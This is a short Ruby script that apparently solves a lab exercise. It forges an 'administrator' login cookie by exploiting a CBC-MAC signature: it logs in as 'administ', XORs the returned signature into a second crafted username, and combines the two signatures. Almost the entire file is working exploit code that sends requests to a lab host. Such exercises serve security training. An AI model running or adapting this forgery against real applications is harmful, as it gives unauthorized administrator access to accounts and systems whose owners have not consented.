# Using 8 bit CBCMAC, gets the login cookie for 8 bits of administrator, decodes and XORs it, then XOR's thelast part of administrator and joins them together
require 'httparty'
require 'base64'

URL = "http://ptl-d40c1556-89b73005.libcurl.so/"
# logging into the url and getting the cookie and splitting it to only return the value
def login(username)
  res = HTTParty.post(URL+'login.php', body: { username: username,
                                               password: 'Password1'},
                                       follow_redirects: false)
  return res.headers["set-cookie"].split("=")[1]
end

cookie = login("administ")
puts cookie
# decode and select the signature part of the cookie
signature1 = Base64.decode64(cookie).split("--")[1]

puts signature1

#set up XOR function
def XOR(str1,str2)
  ret =""
  str1.split(//).each_with_index do |c, i|
    ret[i] = (str1[i].ord ^ str2[i].ord).chr
  end
  return ret
end

# use xor with null bytes to fill the 8 bytes
username2 = XOR("rator\00\00\00", signature1)

cookie2 = login(username2).gsub("%2B", "+")
puts cookie2
signature2 = Base64.decode64(cookie2).split("--")[1]
puts signature2
puts Base64.encode64("administrator--#{signature2}")
